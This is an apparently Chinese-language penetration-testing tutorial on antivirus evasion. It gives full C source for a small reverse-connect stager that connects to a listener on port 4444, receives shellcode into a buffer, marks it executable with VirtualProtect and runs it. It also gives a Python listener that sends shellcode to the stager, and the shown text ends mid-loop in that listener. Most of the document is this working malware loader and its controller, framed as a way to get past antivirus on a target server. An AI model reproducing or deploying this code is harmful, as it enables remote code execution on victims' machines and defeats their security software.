#### 0x00 前言
Shellcode是我们在做渗透或者进行漏洞利用时常用的一段代码,它能够以很小的字节数完成我们想要的结果,然而现在杀毒软件的识别能力也在加强，所以迫使我们要对Shellcode进行加密混淆等等操作达到免杀的目的,怎么能够减少Shellcode被杀的概率呢？下面我来介绍一种比较另类的利用方式。
#### 0x01 科普
搞Web安全的都知道，我们在渗透一个网站的时候,往往需要用到大马和小马。比如一个上传漏洞,如果漏洞上传点限制了文件大小，而我们又无法进行绕过时，那么就需要用到小马,利用小马进行无限制大小的上传我们的大马,从而进一步的控制服务器和利用大马进行提权。
道理一样，我们利用Shellcode进行渗透时,如果服务器安装有杀毒软件,我们没有经过免杀操作的Shellcode就不能在服务器上运行,进而我们需要对Shellcode进行繁琐的免杀操作,所以，受到web端启发,我们可不可以在无法过杀毒软件的情况下上传一个无害的小马呢？答案是可以的。
#### 0x02 小马监听端
测试环境：
1.本机win7 : 127.0.0.1（本机作为攻击机和被攻击机）
2.虚拟机kali : 192.168.19.128（shell监听）
首先我们利用recver_hander模块生成反弹监听小马
我们打开temp.cpp查看小马源码
    //Project : cmosin/purelove
    //This file created with purelove ..
    //Compile : gcc temp.c -o test.exe
    ​    #include                       
    ​    #include                   
    ​    #include               
    ​    #pragma comment (lib, "ws2_32")        
    ​    typedef struct sockaddr_in sockaddr_in;
    ​    int sock_shellcode(char *shellcodes)
    ​    {
    ​            char *shellcode =shellcodes;
    ​            DWORD why_must_this_variable;
    ​            BOOL ret = VirtualProtect (shellcode, strlen(shellcode),
    ​            PAGE_EXECUTE_READWRITE, &why_must_this_variable);
    ​            if (!ret) {
    ​                    return 0;
    ​            }
    ​            ((void (*)(void))shellcode)();
    ​            return 0;
    ​    }  
    ​    int main()
    ​    {
    ​        Sleep(2000);                   
    ​        WSADATA wsaData;
    ​        WSAStartup(MAKEWORD(2, 2), &wsaData);
    ​        SOCKET s=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    ​        sockaddr_in sockaddr;
    ​        sockaddr.sin_family=AF_INET;
    ​        sockaddr.sin_port=htons(4444);
    ​        sockaddr.sin_addr.S_un.S_addr=inet_addr("127.0.0.1");
    ​        connect(s, (SOCKADDR*)&sockaddr, sizeof(SOCKADDR));
    ​            printf("***SERVER***"); 
    ​            while(TRUE)
    ​            {
    ​                    while(TRUE)
    ​                    {
    ​                            char buffer[4096];
    ​                            recv(s, buffer, 4096, NULL);
    ​                            if (buffer == NULL)
    ​                            {
    ​                            continue;
    ​                            }
    ​                            else 
    ​                            {
    ​                            sock_shellcode(buffer);
    ​                            }
    ​                    }
    ​            }
    ​        printf("thins end up");
    ​        closesocket(s);
    ​        WSACleanup();
    ​        getchar();
    ​        exit(0);
    ​    }
​
这个小马，利用了反向连接监听方法，首先我们创建SOCKET套接字，设置远程连接端口和IP地址，这里就用本机进行演示，连接远程IP：127.0.0.1，远程端口4444
    SOCKET s=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     sockaddr_in sockaddr;
     sockaddr.sin_family=AF_INET;
     sockaddr.sin_port=htons(4444);
     sockaddr.sin_addr.S_un.S_addr=inet_addr("127.0.0.1");
     connect(s, (SOCKADDR*)&sockaddr, sizeof(SOCKADDR));
我们写一个死循环来监听远程发送过来的Shellocde,这里的数据内存要写4096,否则小马会因为接收的数据太大而退出，如果你的Shellcode很大，建议对数据进行打包发送和接收，当然还有异常处理什么的这里就不写了。
    while(TRUE)
    {
    ​    while(TRUE)
    ​    {
    ​      char buffer[4096];
    ​      recv(s, buffer, 4096, NULL);
    ​      if (buffer == NULL)
    ​      {
    ​         continue;
    ​       }
    ​      else 
    ​       {
    ​         sock_shellcode(buffer); //shellcode接收执行
    ​       }
    ​     }
     }
下面来到shellcode执行部分,我们设置一个shellcode执行函数`sock_shellcode()`,我们用一个函数来进行内存保护`VirtualProtect()`,最后执行`shellcode,((void
(*)(void))shellcode)();`
    int sock_shellcode(char *shellcodes)
    ​    {
    ​            char *shellcode =shellcodes;
    ​            DWORD test;
    ​            BOOL ret = VirtualProtect (shellcode, strlen(shellcode),
    ​            PAGE_EXECUTE_READWRITE, &test);
    ​            if (!ret) {
    ​                    return 0;
    ​            }
    ​            ((void (*)(void))shellcode)();
    ​            return 0;}
#### 0x03 Shellcode发送端
小马写好了，那么我们来写shellcode发送监听端，shellcode发送监听端我们采用python来写（什么语言无所谓）。
    \#-*- coding: utf-8 -*-    
    import os,sys
    from socket import *
    HOST   = '0.0.0.0'
    PORT   = 4444
    BUFSIZ = 2048
    ADDR   = (HOST, PORT)
    sock   = socket(AF_INET, SOCK_STREAM)
    sock.bind(ADDR)
    sock.listen(1)
    STOP_CHAT = False
    print "Hander Listening %s port:%s" %(HOST,PORT)
    while not STOP_CHAT:
    ​    tcpClientSock, addr=sock.accept()
    ​    print('Start Listening %s  port %s.....') %(addr,PORT)
    ​    while True:
    ​        p = raw_input("send:> ")
    ​        if p =="send":
    ​           data = "" #shellcode存放
    ​        try:
    ​            tcpClientSock.send(data)
    ​            if data.upper()=="QUIT":
    ​                STOP_CHAT = True
    ​                break
    ​            os_result = tcpClientSock.recv(BUFSIZ)
    ​        except:
    ​            tcpClientSock.close()
    ​            break
    ​        if STOP_CHAT:
    ​            break